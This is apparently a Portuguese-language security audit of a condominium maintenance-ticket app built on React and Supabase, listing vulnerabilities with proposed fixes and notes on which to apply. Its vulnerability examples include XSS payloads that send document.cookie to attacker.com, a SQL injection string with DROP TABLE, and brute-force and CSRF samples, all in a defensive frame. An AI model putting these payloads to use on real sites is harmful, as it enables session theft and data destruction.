# 🔒 MELHORIAS DE SEGURANÇA - Condomínio Chamados

## Documento de Análise: Vulnerabilidades e Mitigações

**Data:** 02/09/2026  
**Projeto:** Condomínio Chamados  
**Status:** Análise apenas (sem implementação)  
**Stack:** React 18.3.1 + Vite + Supabase PostgreSQL + Capacitor Android

---

## 📋 SUMÁRIO EXECUTIVO

Sistema possui **19 lacunas de segurança** distribuídas em 4 categorias:

1. **Autenticação & Autorização (5 problemas)** - Crítico
2. **Injeção de Dados & XSS (4 problemas)** - Crítico
3. **API & Comunicação (6 problemas)** - Alto
4. **Infraestrutura & Configuração (4 problemas)** - Médio

**Urgência:** Implementar antes de produção com usuários reais.

---

Todos os que possuem opções de execução, confirmar antes de executar e aplicar alterações no código, o que necessitar que seja feito diretamente/exclusivamente no supabase, não executar e listar. Muito cuidado com qualquer alteração que possa comprometer a funcionalidade de uso para os moradores e usuários autenticados, confirmar antes de execução.

## 🔴 1. AUTENTICAÇÃO & AUTORIZAÇÃO

### #S1: RLS (Row Level Security) Permissiva - CRÍTICO (Executar sem comprometer a visualização dos dados necessários por usuários autenticados como admin, compradores e artífices)

**Status Atual:**
```sql
-- 0011_rls_policies.sql: Políticas MVP completamente abertas
create policy "usuarios_select_publico_mvp" on usuarios
  for select using (true);
create policy "usuarios_insert_publico_mvp" on usuarios
  for insert with check (true);
create policy "usuarios_update_publico_mvp" on usuarios
  for update using (true);
```

**Vulnerabilidade:**
- Qualquer pessoa (autenticada ou não) pode **listar todos os usuários** (nomes, emails, papéis)
- Qualquer pessoa pode **criar novos usuários** manualmente (bypass do trigger)
- Qualquer pessoa pode **editar qualquer usuário** (mudar papéis, desativar, etc)
- Chamados completamente públicos: leitura/escrita para todos

**Impacto:**
- 🚨 **Hackeamento total** - Atacante cria usuário ADMIN e assume controle
- 🚨 Roubo de dados de todos os moradores (nomes, WhatsApp, descrições de problemas)
- 🚨 Falsificação de identidade (alterar nome/email de admin)
- 🚨 Injeção de dados maliciosos em chamados

**Recomendação:**
✅ Usar arquivo `0012_hardening_rls_producao.sql` (já existe no repo)

```sql
-- Fechar acesso publico
create policy "usuarios_select_equipe_interna" on usuarios
  for select using (meu_papel() is not null);  -- Só equipe autenticada

create policy "usuarios_insert_admin" on usuarios
  for insert with check (meu_papel() = 'ADMIN');  -- Só admin

create policy "chamados_select_interno" on chamados
  for select using (
    meu_papel() = 'ADMIN'
    or (meu_papel() = 'COMPRAS' and status = 'EM_COMPRAS')
    or (meu_papel() = 'ARTIFICE' and artifice_id = meu_usuario_id())
  );
```

**Implementação:**
- Aplicar migration `0012_hardening_rls_producao.sql`
- Testar cada papel (ADMIN, COMPRAS, ARTIFICE) individualmente
- Confirmar que anônimos só conseguem: listar condominios ativos, abrir chamado

---

### #S2: Falta de Rate Limiting em Autenticação - CRÍTICO (Não executar - Supabase)

**Status Atual:**
- Sem proteção contra força bruta no login
- Sem limite de tentativas de senha
- Sem CAPTCHA ou desafio de segurança

**Vulnerabilidade:**
```
Atacante executa:
for i in 1..100000:
  POST /auth/sign-in with {email, senha_random}
→ Supabase auth responde a cada tentativa sem limite
```

**Impacto:**
- 🚨 Ataque de força bruta pode descobrir senhas fracas em segundos
- 🚨 Negação de serviço (DoS) - spam de requisições bloqueia legítimos

**Recomendação:**
Implementar rate limiting na API:

**Opção A - Supabase Auth (Configuração):**
```
No Supabase Dashboard → Project Settings → Auth:
- "Rate limit" ativado por padrão (1 request/segundo por IP)
- Verificar se está ENABLED
- Considerar aumentar para 5 req/10s (mais sensato)
```

**Opção B - Edge Function com Rate Limit:**
```typescript
// supabase/functions/verify-login/index.ts
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";
import { kv } from "https://deno.land/x/redis@v0.32.3/mod.ts";

serve(async (req) => {
  const ip = req.headers.get("x-forwarded-for") || "unknown";
  const key = `ratelimit:login:${ip}`;
  const count = await kv.incr(key);
  
  if (count > 5) {
    return new Response("Too many attempts", { status: 429 });
  }
  
  await kv.expire(key, 900); // 15 minutos
  // ... continuar com autenticação
});
```

**Opção C - Implementar no Frontend (mitigation apenas):**
```typescript
// frontend/src/context/AuthContext.tsx
const [tentativas, setTentativas] = useState(0);
const [bloqueado, setBloqueado] = useState(false);

async function entrar(email: string, senha: string) {
  if (tentativas >= 5) {
    setBloqueado(true);
    // Usuário bloqueado por 15 minutos
    setTimeout(() => setBloqueado(false), 900000);
    return { erro: "Muitas tentativas. Tente novamente em 15 minutos." };
  }
  
  const { error } = await supabase.auth.signInWithPassword({ email, password: senha });
  if (error) {
    setTentativas(prev => prev + 1);
  } else {
    setTentativas(0);
  }
}
```

**Prioridade:** 🔴 CRÍTICO (implementar antes de produção)

---

### #S3: Ausência de Validação de Email no Trigger de Auth - ALTO (Removido, não executar. Login não é feito com e-mail pessoal do usuário, não há como receber e-mail de verificação ou validação.)

### #S4: Sem Controle de Sessão & Token Refresh - MÉDIO (Executar)

**Status Atual:**
```typescript
// frontend/src/context/AuthContext.tsx
supabase.auth.onAuthStateChange(async (evento, novaSessao) => {
  if (evento === 'TOKEN_REFRESHED') return; // Ignora refresh
  // Mas não valida se token ainda é válido
});
```

**Vulnerabilidade:**
- Token padrão Supabase: 1 hora expiração
- ❌ Sem detecção se token foi revogado externamente (logout em outro dispositivo)
- ❌ Sem "Session Hijacking" check
- ❌ Sem mecanismo de "Force Logout" do admin

**Impacto:**
- 🟠 Se admin desativa usuário, frontend não rejeita imediatamente
- 🟠 Se token é comprometido, sem forma de revogá-lo globalmente

**Recomendação:**
```typescript
// frontend/src/context/AuthContext.tsx
async function validarSessaoAtiva() {
  const { data: { session }, error } = await supabase.auth.getSession();
  
  if (!session) {
    setUsuario(null);
    return false;
  }
  
  // Validar contra BD se usuário ainda está ativo
  const { data: usuario } = await supabase
    .from('usuarios')
    .select('*')
    .eq('auth_user_id', session.user.id)
    .eq('ativo', true)
    .single();
  
  if (!usuario) {
    // Usuário desativado - logout forçado
    await supabase.auth.signOut();
    setUsuario(null);
  }
}

// Validar a cada 5 minutos
useEffect(() => {
  const interval = setInterval(validarSessaoAtiva, 5 * 60 * 1000);
  return () => clearInterval(interval);
}, []);
```

**Prioridade:** 🟠 MÉDIO

---

### #S5: Sem Multi-factor Authentication (MFA) - MÉDIO (Confirmar se realmente vai querer esse multi-factor antes de mudar o código e adicionar ao supabase, pois o e-mail de login do usuário não é um e-mail real, é apenas um login criado com @ pelo admin)

**Status Atual:**
- Login simples: email + senha apenas
- Sem 2FA / TOTP / SMS

**Vulnerabilidade:**
- Senha fraca/comprometida = acesso total
- Sem proteção adicional para contas privilegiadas (ADMIN)

**Recomendação:**
```typescript
// Supabase Auth suporta MFA nativo
// 1. Ativar no Dashboard → Project Settings → Auth → MFA
// 2. No código, solicitar TOTP na tela de login

// frontend/src/pages/auth/LoginMFA.tsx
async function registrarMFA(usuarioId: string) {
  const { data, error } = await supabase.auth.mfa
    .enroll({
      factorType: 'totp',
    });
  
  if (data?.totp?.qr_code) {
    // Mostrar QR code em tela
    exibirQRCode(data.totp.qr_code);
  }
}

async function verificarMFA(code: string) {
  const { data, error } = await supabase.auth.mfa.verify({
    factorId: data.id,
    code,
  });
}
```

**Prioridade:** 🟡 MÉDIO (opcional inicialmente, mas obrigatório para ADMIN)

---

## 🔴 2. INJEÇÃO DE DADOS & XSS

### #S6: Sem Sanitização de Input em Campos de Observação - CRÍTICO (cnfirmar qual opção irá aplicar antes de qualquer alteração no código)

**Status Atual:**
```typescript
// frontend/src/pages/admin/AdminSolicitacaoDetalhe.tsx
const observacao = observacaoInput.value; // String bruta

await supabase
  .from('chamados')
  .update({ observacao_aprovacao: observacao }) // Insere direto
  .eq('id', chamado.id);
```

**Vulnerabilidade:**
```javascript
Atacante digita em "Observação de Aprovação":
<img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">

No BD fica armazenado: observacao_aprovacao = "<img src=x onerror=..."
Quando outro usuário lê, XSS executa
```

**Impacto:**
- 🚨 Roubo de cookies/tokens de sessão
- 🚨 Redirecionamento para fake login (phishing)
- 🚨 Execução de código arbitrário no navegador
- 🚨 Defacement da aplicação

**Recomendação:**

**Opção A - DOMPurify (Recomendado):**
```bash
# Instalar
npm install dompurify
npm install --save-dev @types/dompurify
```

```typescript
// frontend/src/utils/sanitizar.ts
import DOMPurify from 'dompurify';

export function sanitizarHTML(texto: string): string {
  return DOMPurify.sanitize(texto, { 
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'], // Tags permitidas
    ALLOWED_ATTR: [] // Nenhum atributo
  });
}

export function sanitizarTextoPlano(texto: string): string {
  // Remove TUDO, só mantém texto
  return DOMPurify.sanitize(texto, { 
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
}
```

**Opção B - Validação + Encode (Mais leve):**
```typescript
// frontend/src/utils/sanitizar.ts
export function encodeHTML(texto: string): string {
  const div = document.createElement('div');
  div.textContent = texto; // textContent escapa automaticamente
  return div.innerHTML;
}

export function validarNaoTemHTML(texto: string): boolean {
  return !/<[^>]*>/.test(texto);
}
```

**Uso no código:**
```typescript
// frontend/src/pages/admin/AdminSolicitacaoDetalhe.tsx
import { sanitizarTextoPlano, validarNaoTemHTML } from '@/utils/sanitizar';

const observacao = observacaoInput.value;

if (!validarNaoTemHTML(observacao)) {
  setErro('Observação não pode conter HTML');
  return;
}

await supabase
  .from('chamados')
  .update({ observacao_aprovacao: observacao })
  .eq('id', chamado.id);
```

**Exibição segura (React):**
```typescript
// ✅ SEGURO - React escapa por padrão
<p>{chamado.observacao_aprovacao}</p>

// ❌ INSEGURO - Renderiza HTML bruto
<p dangerouslySetInnerHTML={{ __html: chamado.observacao_aprovacao }} />
```

**Aplicar em todos os campos de texto livre:**
- observacao_aprovacao
- observacao_compras  
- observacao_artifice
- motivo_rejeicao
- motivo_nao_execucao

**Prioridade:** 🔴 CRÍTICO

---

### #S7: SQL Injection via Supabase Client - ALTO (a constatação abaixo trata-se apenas de uma verificação, e analisa que o uso atual do supabase client é suficiente. Caso seja necessário allguma alteração, solicigtar confirmação antes.)

**Status Atual:**
```typescript
// frontend/src/pages/admin/AdminChamadoDetalhe.tsx
const { error } = await supabase
  .from('chamados')
  .update({ status: 'CANCELADO' })
  .eq('id', chamado.id); // Usando parameterizado (SEGURO)
```

**Bom:** Supabase client usa prepared statements por padrão.  
**Ruim:** Se houvesse queries rawSQL diretas, seria vulnerável.

**Vulnerabilidade Potencial:**
```typescript
// ❌ NUNCA FAZER ISSO:
const query = `SELECT * FROM chamados WHERE id = '${chamadoId}'`;
const { data } = await supabase.rpc('executa_query_bruta', { query });

// Atacante: chamadoId = "'; DROP TABLE chamados; --"
```

**Impacto:**
- 🚨 Deletar/modificar dados sem autorização
- 🚨 Extrair dados confidenciais
- 🚨 Corromper integridade do banco

**Recomendação:**
✅ **Manter uso de Supabase client (não fazer rawSQL)**

```typescript
// ✅ BOM - Sempre usar client com filtros seguros
await supabase
  .from('chamados')
  .select('*')
  .eq('id', chamadoId)
  .eq('condominio_id', usuario.condominio_id);

// ✅ BOM - Se precisar de lógica customizada, usar Edge Functions/RPC seguro
const { data } = await supabase.rpc('buscar_chamado_por_id', {
  p_chamado_id: chamadoId,
  p_usuario_id: usuario.id
});
```

**No BD (PostgreSQL), criar RPC seguro:**
```sql
-- supabase/migrations/0013_secure_rpc.sql
create or replace function buscar_chamado_por_id(
  p_chamado_id uuid,
  p_usuario_id uuid
) returns chamados as $$
declare
  chamado chamados;
begin
  -- Valida se usuário tem permissão (autorização no SQL)
  select c.* into chamado
  from chamados c
  join usuarios u on u.id = p_usuario_id
  where c.id = p_chamado_id
    and (
      u.papel = 'ADMIN'
      or (u.papel = 'COMPRAS' and c.status = 'EM_COMPRAS')
      or (u.papel = 'ARTIFICE' and c.artifice_id = u.id)
    );
  
  return chamado;
end;
$$ language plpgsql stable security definer;
```

**Prioridade:** 🟠 MÉDIO (mitigado pelo framework)

---

### #S8: Sem Validação de Tipo MIME em Uploads - CRÍTICO (confirmar qual opção antes de executar, recomendo opção A)

**Status Atual:**
```typescript
// frontend/src/utils/uploadAnexo.ts
const extensao = arquivo.name.split('.').pop() ?? 'bin';
const caminho = `${chamadoId}/${tipo.toLowerCase()}-${Date.now()}.${extensao}`;

const { error: erroUpload } = await supabase.storage
  .from(BUCKET_ANEXOS)
  .upload(caminho, arquivo, { cacheControl: '3600', upsert: false });
```

**Vulnerabilidade:**
```javascript
Atacante faz upload:
arquivo.name = "malware.exe" (disfarçado de PDF)
arquivo.type = "application/pdf"
→ Upload aceita sem validar

Depois: .com.br/storage/anexos/chamado-123/malware.exe
→ Navegador baixa e executa
```

**Impacto:**
- 🚨 Distribuição de malware
- 🚨 Roubo de credenciais de quem baixa arquivo
- 🚨 Acesso ao computador do usuário

**Recomendação:**

**Opção A - Validação no Frontend:**
```typescript
// frontend/src/utils/uploadAnexo.ts
const MIMES_PERMITIDAS = {
  'FOTO_SOLICITACAO': ['image/jpeg', 'image/png', 'image/webp'],
  'ORCAMENTO': ['application/pdf', 'image/jpeg', 'image/png'],
  'COMPROVANTE_COMPRA': ['application/pdf', 'image/jpeg', 'image/png'],
  'FOTO_ANTES': ['image/jpeg', 'image/png', 'image/webp'],
  'FOTO_DEPOIS': ['image/jpeg', 'image/png', 'image/webp'],
  'ANEXO_REJEICAO': ['application/pdf', 'image/jpeg', 'image/png'],
};

const TAMANHO_MAX = {
  'FOTO_SOLICITACAO': 5 * 1024 * 1024, // 5MB
  'ORCAMENTO': 10 * 1024 * 1024, // 10MB
  'COMPROVANTE_COMPRA': 5 * 1024 * 1024,
  'FOTO_ANTES': 5 * 1024 * 1024,
  'FOTO_DEPOIS': 5 * 1024 * 1024,
  'ANEXO_REJEICAO': 5 * 1024 * 1024,
};

export async function enviarAnexoChamado(params: {
  chamadoId: string;
  arquivo: File;
  tipo: TipoAnexo;
  descricao?: string;
  enviadoPor?: string | null;
}): Promise<void> {
  const { chamadoId, arquivo, tipo, descricao, enviadoPor } = params;

  // 1. Validar MIME type
  if (!MIMES_PERMITIDAS[tipo].includes(arquivo.type)) {
    throw new Error(
      `Arquivo inválido. Permitidos: ${MIMES_PERMITIDAS[tipo].join(', ')}`
    );
  }

  // 2. Validar tamanho
  if (arquivo.size > TAMANHO_MAX[tipo]) {
    throw new Error(
      `Arquivo muito grande (máx ${TAMANHO_MAX[tipo] / 1024 / 1024}MB)`
    );
  }

  // 3. Validar conteúdo real (magic bytes)
  const buffer = await arquivo.arrayBuffer();
  const view = new Uint8Array(buffer);
  
  if (!validarMagicBytes(view, arquivo.type)) {
    throw new Error('Arquivo corrompido ou tipo inválido');
  }

  // ... resto do upload
}

function validarMagicBytes(
  bytes: Uint8Array,
  mimeType: string
): boolean {
  // JPEG: FF D8 FF
  if (mimeType === 'image/jpeg') {
    return bytes[0] === 0xff && bytes[1] === 0xd8 && bytes[2] === 0xff;
  }
  
  // PNG: 89 50 4E 47
  if (mimeType === 'image/png') {
    return bytes[0] === 0x89 && bytes[1] === 0x50 &&
           bytes[2] === 0x4e && bytes[3] === 0x47;
  }
  
  // PDF: 25 50 44 46
  if (mimeType === 'application/pdf') {
    return bytes[0] === 0x25 && bytes[1] === 0x50 &&
           bytes[2] === 0x44 && bytes[3] === 0x46;
  }
  
  return false;
}
```

**Opção B - Validação no Backend (Supabase Edge Function):**
```typescript
// supabase/functions/validar-anexo/index.ts
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";

serve(async (req) => {
  const formData = await req.formData();
  const arquivo = formData.get('arquivo') as File;
  const tipo = formData.get('tipo') as string;
  
  // 1. Validar MIME
  const mimeValido = ['image/jpeg', 'image/png', 'application/pdf'].includes(
    arquivo.type
  );
  
  if (!mimeValido) {
    return new Response(JSON.stringify({ erro: 'MIME inválido' }), {
      status: 400,
    });
  }
  
  // 2. Validar magic bytes
  const bytes = await arquivo.bytes();
  if (!validarMagicBytes(bytes.slice(0, 4), arquivo.type)) {
    return new Response(JSON.stringify({ erro: 'Arquivo corrompido' }), {
      status: 400,
    });
  }
  
  return new Response(JSON.stringify({ ok: true }), { status: 200 });
});
```

**Configuração Supabase Storage:**
```sql
-- supabase/migrations/0013_storage_policies.sql
create policy "chamado_anexos_tipo_validado" on storage.objects
  for insert
  with check (
    bucket_id = 'chamados-anexos'
    and (
      storage.extension(name) = any(array['jpg', 'jpeg', 'png', 'webp', 'pdf'])
    )
  );
```

**Prioridade:** 🔴 CRÍTICO

---

### #S9: Sem Content Security Policy (CSP) - ALTO (confirmar antes de executar, recomendo opção A)

**Status Atual:**
- `frontend/vite.config.ts` não define CSP headers
- Sem proteção contra inline scripts

**Vulnerabilidade:**
```html
<!-- Se XSS injetar isso: -->
<script>
  fetch('https://attacker.com/steal-cookie?c=' + document.cookie);
</script>
→ Script executa sem restrição
```

**Impacto:**
- 🚨 Facilita exploração de XSS
- 🚨 Sem proteção contra ataques de cache poisoning

**Recomendação:**

**Opção A - Vite Plugin (Dev):**
```typescript
// frontend/vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'node:path';

export default defineConfig({
  plugins: [
    react(),
    {
      name: 'csp-headers',
      configResolved(config) {
        if (config.command === 'serve') {
          config.middlewares.push((req, res, next) => {
            res.setHeader(
              'Content-Security-Policy',
              `
                default-src 'self';
                script-src 'self' 'wasm-unsafe-eval';
                style-src 'self' 'unsafe-inline';
                img-src 'self' data: https:;
                font-src 'self' data:;
                connect-src 'self' https://*.supabase.co https://api.github.com;
                frame-ancestors 'none';
                base-uri 'self';
                form-action 'self';
              `.replace(/\n/g, '')
            );
            next();
          });
        }
      },
    },
  ],
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
});
```

**Opção B - Headers no Vercel (Produção):**
```javascript
// vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co; frame-ancestors 'none';"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        }
      ]
    }
  ]
}
```

**Prioridade:** 🟠 MÉDIO

---

## 🟠 3. API & COMUNICAÇÃO

### #S10: Sem HTTPS Enforcement - CRÍTICO (Não executar - Vercel)

**Status Atual:**
- Supabase sempre usa HTTPS ✅
- Vercel sempre usa HTTPS ✅
- ❌ Mas falta `HSTS` (HTTP Strict-Transport-Security)

**Vulnerabilidade:**
```
Atacante intercepta primeira requisição HTTP
→ Redireciona para https://fake-site.com
→ Usuário vê certificado inválido mas pode aceitar
→ Credenciais capturadas
```

**Impacto:**
- 🔴 MITM (Man-in-the-Middle) attack possível
- 🔴 Roubo de credenciais

**Recomendação:**

**Ativar HSTS no Vercel:**
```json
// vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        }
      ]
    }
  ]
}
```

**Prioridade:** 🔴 CRÍTICO

---

### #S11: Sem CORS Restritivo - MÉDIO (Não executar - Supabase)

**Status Atual:**
```typescript
// supabase/lib/supabaseClient.ts
export const supabase = createClient(supabaseUrl, supabaseAnonKey);
// CORS permitido para qualquer origem (Supabase default)
```

**Vulnerabilidade:**
- Qualquer site pode fazer requisições para sua API
- CSRF (Cross-Site Request Forgery) possível

**Impacto:**
- 🟠 Site malicioso redireciona usuário para delete chamado
- 🟠 Sem proteção de origem

**Recomendação:**

**Configurar CORS no Supabase:**
```bash
# Supabase Dashboard → Project Settings → API
# Na seção "CORS" adicionar:
- https://seu-dominio.com.br
- https://www.seu-dominio.com.br
# (NÃO usar *)
```

**No Frontend, sempre validar origin:**
```typescript
// frontend/src/lib/supabaseClient.ts
const allowedOrigins = [
  'https://seu-dominio.com.br',
  'https://www.seu-dominio.com.br',
];

if (!allowedOrigins.includes(window.location.origin)) {
  throw new Error('Origem não autorizada');
}
```

**Prioridade:** 🟡 MÉDIO

---

### #S12: Sem Rate Limiting em Chamadas API - ALTO (Não executar - Supabase)

**Status Atual:**
- Sem proteção contra spam de requisições
- Usuário pode fazer 1000 inserts/updates em 1 segundo

**Vulnerabilidade:**
```typescript
// Atacante executa em loop:
for (let i = 0; i < 10000; i++) {
  await supabase
    .from('chamados')
    .insert({
      condominio_id: condominioId,
      morador_nome: 'Spam' + i,
      ...
    });
}
→ Banco sobrecarrega, usuários legítimos perdem acesso
```

**Impacto:**
- 🔴 DoS (Denial of Service)
- 🔴 Custo não controlado (BD grátis tem limite de throughput)

**Recomendação:**

**Opção A - Supabase Realtime Connections Limit:**
```sql
-- supabase/migrations/0013_rate_limit.sql
-- Usar triggers para throttle

create or replace function check_rate_limit(user_id uuid)
returns boolean
language sql
security definer
as $$
  select not exists (
    select 1
    from chamado_historico
    where criado_por = user_id
      and criado_em > now() - interval '1 minute'
    group by user_id
    having count(*) > 10  -- Max 10 ações por minuto
  );
$$;
```

**Opção B - Edge Function com Redis:**
```typescript
// supabase/functions/rate-limit-check/index.ts
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";
import { kv } from "https://deno.land/x/redis@v0.32.3/mod.ts";

serve(async (req) => {
  const userId = req.headers.get("x-user-id");
  const key = `api:requests:${userId}`;
  
  const count = await kv.incr(key);
  await kv.expire(key, 60); // 1 minuto
  
  if (count > 30) {
    return new Response(JSON.stringify({ erro: "Rate limit exceeded" }), {
      status: 429,
    });
  }
  
  return new Response(JSON.stringify({ ok: true }), { status: 200 });
});
```

**No Frontend (mitigation):**
```typescript
// frontend/src/utils/requestQueue.ts
const requestQueue = new Map<string, number[]>(); // userId → timestamps

export function verificarRateLimit(userId: string): boolean {
  const agora = Date.now();
  const minutoAtras = agora - 60000;
  
  if (!requestQueue.has(userId)) {
    requestQueue.set(userId, []);
  }
  
  const timestamps = requestQueue.get(userId)!
    .filter(t => t > minutoAtras);
  
  if (timestamps.length >= 30) {
    return false; // Excedeu limite
  }
  
  timestamps.push(agora);
  requestQueue.set(userId, timestamps);
  return true;
}
```

**Prioridade:** 🟠 ALTO

---

### #S13: Sem Logging de Auditoria Detalhado - MÉDIO

**Status Atual:**
```sql
-- 0002_state_machine.sql: Registra histórico simples
insert into chamado_historico (...)
values (status_novo, usuario_id, ...);
```

**Vulnerabilidade:**
- ✅ Histórico de status registrado
- ❌ Sem log de quem acessou o chamado
- ❌ Sem log de login/logout
- ❌ Sem log de exports de dados

**Impacto:**
- 🟠 Impossível detectar abuso
- 🟠 Sem rastreabilidade de violação

**Recomendação:**

```sql
-- supabase/migrations/0013_audit_log.sql
create table audit_log (
  id uuid primary key default gen_random_uuid(),
  usuario_id uuid references usuarios(id),
  acao varchar(50) not null, -- SELECT, INSERT, UPDATE, DELETE, LOGIN, LOGOUT
  tabela varchar(50),
  registro_id uuid,
  dados_antes jsonb,
  dados_depois jsonb,
  ip_address inet,
  user_agent text,
  criado_em timestamptz default now()
);

-- Trigger para registrar updates
create or replace function log_auditoria()
returns trigger
language plpgsql
security definer
as $$
begin
  insert into audit_log (
    usuario_id, acao, tabela, registro_id, dados_antes, dados_depois, criado_em
  ) values (
    meu_usuario_id(),
    tg_op,
    tg_table_name,
    (coalesce(new, old)).id,
    row_to_json(old),
    row_to_json(new),
    now()
  );
  return coalesce(new, old);
end;
$$;

-- Aplicar em todas as tabelas
create trigger audit_chamados after insert or update or delete on chamados
  for each row execute function log_auditoria();
create trigger audit_usuarios after insert or update or delete on usuarios
  for each row execute function log_auditoria();
```

**No Frontend (registrar logins):**
```typescript
// frontend/src/context/AuthContext.tsx
async function entrar(email: string, senha: string) {
  const { error } = await supabase.auth.signInWithPassword({ email, password: senha });
  if (!error) {
    await supabase.from('audit_log').insert({
      acao: 'LOGIN',
      ip_address: (await fetch('https://api.ipify.org?format=json')).json().ip,
      user_agent: navigator.userAgent,
    });
  }
}

async function sair() {
  await supabase.auth.signOut();
  await supabase.from('audit_log').insert({
    acao: 'LOGOUT',
  });
}
```

**Prioridade:** 🟡 MÉDIO

---

### #S14: Sem Proteção Contra CSRF - ALTO

**Status Atual:**
- Frontend envia requests HTTP diretamente
- Sem validação de token CSRF

**Vulnerabilidade:**
```html
<!-- Site malicioso tira vantagem: -->
<form action="https://seu-dominio.com.br/api/chamados" method="POST">
  <input name="descricao" value="Aprovado" />
  <input type="submit" value="Click me">
</form>
→ Se usuário autenticado clica, cria chamado falso
```

**Impacto:**
- 🔴 Ações não autorizadas em nome do usuário

**Recomendação:**

**SameSite Cookies (Supabase já usa):**
```typescript
// Supabase Auth já configura: Set-Cookie: ... ; SameSite=Lax
// Verificar no navegador DevTools → Application → Cookies
```

**Token CSRF adicional (camada extra):**
```typescript
// frontend/src/utils/csrf.ts
let csrfToken: string | null = null;

export async function obterCSRFToken(): Promise<string> {
  if (csrfToken) return csrfToken;
  
  const { data } = await supabase.functions.invoke('get-csrf-token');
  csrfToken = data.token;
  return csrfToken;
}

export function validarCSRF(token: string): boolean {
  // Comparar com token no sessionStorage
  return sessionStorage.getItem('csrf-token') === token;
}
```

**No Backend:**
```typescript
// supabase/functions/get-csrf-token/index.ts
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";
import { v4 } from "https://deno.land/std@0.208.0/uuid/mod.ts";

serve(async (req) => {
  const token = v4.generate();
  return new Response(JSON.stringify({ token }), {
    headers: {
      'Set-Cookie': `csrf_token=${token}; HttpOnly; Secure; SameSite=Strict`,
    },
  });
});
```

**Prioridade:** 🟠 ALTO

---

## 🟡 4. INFRAESTRUTURA & CONFIGURAÇÃO

### #S15: Variáveis de Ambiente Expostas - CRÍTICO (Variáveis não expostas, implementação já realizada no vercel em enviroment variables, .env não está em commit nem no git, verificar apenas se secrets estão expostas pelo código e se há risco dessa exposição.)

**Status Atual:**
```typescript
// frontend/.env.local (não commitado ✅)
VITE_SUPABASE_URL=https://...
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIs... (exposto no código)

// Supabase Anon Key é PUBLICA (ok)
// Mas se existir SERVICE_ROLE_KEY aqui = CRÍTICO
```

**Vulnerabilidade:**
```javascript
// Anon key é pública (by design do Supabase)
// Mas se commitada no git com SERVICE_ROLE_KEY:
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOi... → Acesso total ao BD!
```

**Impacto:**
- 🚨 Se SERVICE_ROLE_KEY vaza, hackeador tem acesso root ao BD

**Recomendação:**

✅ **Já implementado:**
```
.gitignore contém: .env.local, .env.production
```

✅ **Verificar:**
```bash
# Confirmar que .env não está no git
git ls-files | grep -E '\.env'
# Resultado: (nada = ✅)

# Procurar secrets no histórico git
git log -p --all -S "SUPABASE_SERVICE_ROLE_KEY" | head -20
```

⚠️ **Se encontrar secrets no git:**
```bash
# 1. Fazer commit removendo o arquivo
git rm --cached .env.local
git commit -m "Remove exposed .env"

# 2. Invalidar chave no Supabase Dashboard
# Project Settings → API Keys → Regenerate SERVICE_ROLE_KEY

# 3. Usar git-filter-branch ou BFG para limpar histórico
# (Cuidado: altera hashes de commits)
bfg --delete-files .env.local
```

**Configuração Vercel (Produção):**
```bash
# No Vercel Dashboard → Settings → Environment Variables
# Adicionar:
VITE_SUPABASE_URL=https://...
VITE_SUPABASE_ANON_KEY=eyJ...
SUPABASE_SERVICE_ROLE_KEY=eyJ... (NUNCA no frontend)
```

**Prioridade:** 🔴 CRÍTICO (verificar imediatamente)

---

### #S16: Sem HTTPS em Requests Internas - MÉDIO (Não executar - opcional)

**Status Atual:**
```typescript
// supabase/migrations/0002_state_machine.sql
-- Comunicação intra-BD: ✅ HTTPS (mesma máquina)

// frontend/src/lib/supabaseClient.ts
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
→ Supabase URL sempre HTTPS ✅
```

**Bom:** Supabase força HTTPS.  
**Ruim:** Sem pinning de certificado.

**Vulnerabilidade:**
- Rara, mas se certificado CA for comprometido, MITM possível

**Recomendação:**

**Certificate Pinning (opcional, complexo):**
```typescript
// Apenas em casos de altíssima segurança
// Para este projeto: opcional
```

**Prioridade:** 🟢 BAIXO (Supabase já protege)

---

### #S17: Sem Secrets Rotation Policy - MÉDIO (Não executar)

**Status Atual:**
- Anonkey Supabase: sem rotação definida
- JWT tokens: expiração 1 hora (ok)
- Refresh tokens: sem política

**Vulnerabilidade:**
- Se chave é comprometida, fica ativa indefinidamente

**Impacto:**
- 🟠 Compromisso prolongado

**Recomendação:**

**Definir Política de Rotação:**
```
Anon Key:
  - Rotacionar a cada 90 dias
  - Processo: Gerar nova → Publicar → Remover antiga

Service Role Key:
  - Rotacionar a cada 30 dias
  - NUNCA expor publicamente
  - Guardar em Vercel Secrets

JWT Refresh Token:
  - 7 dias expiração (configurável no Supabase)
  - Implementar rotação automática

Certificado HTTPS:
  - Auto-renovável (Vercel + Let's Encrypt)
  - Revisar a cada 3 meses
```

**Prioridade:** 🟡 MÉDIO

---

### #S18: Sem Proteção de Dados em Repouso - MÉDIO (Não executar - opcional)

**Status Atual:**
```
Supabase DB (PostgreSQL):
  - Criptografia de dados em repouso: ✅ (Supabase Enterprise)
  - Nosso plano Free: ❓ (não documentado)

Storage (S3):
  - Arquivos públicos: Sem criptografia individual
  - Senha de acesso: Somente URL pública (ok)
```

**Vulnerabilidade:**
- Se disco do servidor for fisicamente roubado (raro)
- Dados visíveis em plaintext

**Impacto:**
- 🟠 Sem proteção física

**Recomendação:**

**Upgrade para Supabase Pro/Enterprise:**
- Criptografia at-rest automática
- Backups criptografados

**Alternativa para Free Tier:**
```sql
